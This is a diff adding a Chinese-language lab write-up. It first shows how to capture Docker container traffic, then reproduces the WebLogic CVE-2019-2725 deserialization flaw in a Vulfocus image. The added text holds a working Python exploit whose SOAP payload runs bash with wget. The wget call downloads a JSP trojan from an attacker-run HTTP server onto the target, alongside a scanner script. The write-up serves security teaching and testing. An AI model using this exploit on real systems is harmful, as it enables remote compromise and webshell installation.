@@ -305,3 +305,246 @@ flag-{bmh20c56a41-fc29-44f1-9da4-0e3b7bbfb8ff}
 在管理界面提交该flag通过
 
 ![](img/getflag2.png)
+
+
+
+<br>
+
+#### 流量检测与防护
+
+使用 Docker 的网络命名空间和网络抓包工具来捕获和分析流量。
+
+- 获取容器的 PID（进程ID）
+
+```bash
+# 查看容器运行情况
+docker ps
+
+docker inspect -f '{{.State.Pid}}' <container_name>
+# 请将 <container_name> 替换为要监视流量的容器的名称
+```
+
+![](img/findPID.png)
+
+- 使用 `nsenter` 命令进入容器的网络命名空间
+
+```bash
+nsenter -t <container_pid> -n
+# 将 <container_pid> 替换为上一步中获取到的容器 PID
+```
+
+- 使用网络抓包工具（如 `tcpdump` 或 `tshark`）来捕获和分析流量
+
+```bash
+tcpdump -i eth0 -w captured_traffic.pcap
+```
+
+这将在容器的 eth0 网络接口上捕获流量，并将结果保存到 `captured_traffic.pcap` 文件中
+
+![](img/openmonitor.png)
+
+在`captured_traffic.pcap` 文件中可以查看到所有访问到容器的流量
+
+![](img/suspectedtraffic.png)
+
+可以查看到疑似远程代码执行的攻击流量
+
+<br>
+
+### Weblogic反序列化远程命令执行（CVE-2019-2725）漏洞
+
+CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。
+
+**影响版本** ：
+weblogic 10.x
+weblogic 12.1.3
+
+#### 漏洞复现
+
+使用Vulfocus平台中的镜像进行复现
+
+![](img/WeblogicMirroring.png)
+
+启动后访问镜像
+
+```bash
+http://192.168.56.108:30965/
+```
+
+![](img/accessmirror.png)
+
+访问/_async/AsyncResponseService路径
+
+![](img/accesspath.png)
+
+存在漏洞
+
+#### 自动化漏洞验证
+
+编写**POC代码**
+
+检测函数`checking(url)`中，脚本会发送GET请求到目标URL的`/_async/AsyncResponseService`路径，并检查响应状态码。如果状态码为200，表示目标存在CVE-2019-2725漏洞；否则，表示目标不受该漏洞影响。
+
+```python
+def checking(url):
+  try:
+    response = requests.get(url+filename)
+    if response.status_code == 200:
+      print('[+] {0} 存在CVE-2019-2725 Oracle weblogic 反序列化远程命令执行漏洞'.format(url))
+    else:
+      print('[-] {0} 不存在CVE-2019-2725 Oracle weblogic 反序列化远程命令执行漏洞'.format(url))
+  except Exception as e:
+    print("[-] {0} 连接失败".format(url))
+    exit()
+if options.FILE and os.path.exists(options.FILE):
+  with open(options.FILE) as f:
+    urls = f.readlines()
+    #print(urls)
+    for url in urls:
+      url = str(url).replace('\n','').replace('\r','').strip()
+      checking(url)
+elif options.FILE and not os.path.exists(options.FILE):
+  print('[-] {0} 文件不存在'.format(options.FILE))
+  exit()
+else:
+  #上传链接
+  url = options.URL+':'+options.PORT
+  checking(url)
+```
+
+测试
+
+```bash
+python3 poc.py -f IP_test.txt -p
+```
+
+![](img/poc.png)
+
+检测出存在CVE-2019-2725漏洞
+
+#### 脚本攻击
+
+编写**EXP代码**
+
+首先定义HTTP请求的headers和data
+
+```python
+headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
+           'SOAPAction': 'Accept: */*',
+           'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
+           'content-type': 'text/xml'}
+data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
+xmlns:asy="http://www.bea.com/async/AsyncResponseService">
+<soapenv:Header>
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>wget {0} -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/{1}/war/3.jsp</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>'''.format(options.LOCATE, route(url + url_route + '?info'))
+
+```
+
+获取WebLogic中间件版本目录
+
+```python
+#获得weblogic中间的版本目录
+def route(url):
+  print('[*] 获得路径中')
+  try:
+    #print('[*] 目标地址:'+url)
+    respond = requests.get(url)
+    if respond.status_code == 200:
+      route = str(respond.text)
+      start = route.index('async_response/')
+      #print(start)
+      if start >= 0:
+        start += len('async_response/')
+      #print(start)
+      end = route.index('/war')
+      #print(end)
+      #print(route[start:end])
+      return route[start:end];
+    else:
+      print("[-] 路径获取失败")
+      exit()
+  except Exception as e:
+    print("[-]{0}连接失败".format(url))
+    exit()
+```
+
+实现发送HTTP请求，获得WebLogic中间件版本目录
+
+从攻击者http服务器中下载木马文件
+
+```python
+def acquire(url):
+  print('[*] 目标地址:'+url)
+  print('[*] 攻击者地址:'+options.LOCATE)
+  try:
+    respond = requests.post(url+url_route,headers=headers,data = data)
+    #print(respond.status_code)
+    if respond.status_code == 202:
+      print('[+] 木马下载成功')
+    else:
+      print('[-] 下载失败')
+      exit()
+  except Exception as e:
+    print("[-]{0}连接失败".format(url))
+    exit()
+```
+
+本地启动简易的http服务器，代理木马文件attackjsp.txt
+
+```
+python3 -m http.server 8000
+```
+
+![](img/Starttheserverlocally.png)
+
+部署好木马服务器后执行攻击脚本
+
+```bash
+python3 exp.py -u <target_url> -p <target_port> -l <service_script>
+#<target_url> 替换为目标的URL地址，<target_port> 替换为目标的端口号，<service_script> 替换为服务脚本的位置。
+```
+
+![](img/expattacker.png)
+
+木马服务器显示收到请求
+
+![](img/mumafuwuqi.png)
+
+此时查看受害者服务器中是否下载了木马程序
+
+```bash
+docker ps
+docker exec -it ec8fb7023c85 bash
+
+cd user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war
+```
+
+![](img/findjsp.png)
+
+## 🔍参考链接
+
+[关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告（第二版）](https://www.cnvd.org.cn/webinfo/show/4999)
+
+[网络安全课件-黄玮](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html)
+
+[awd_script](https://github.com/i0gan/awd_script)
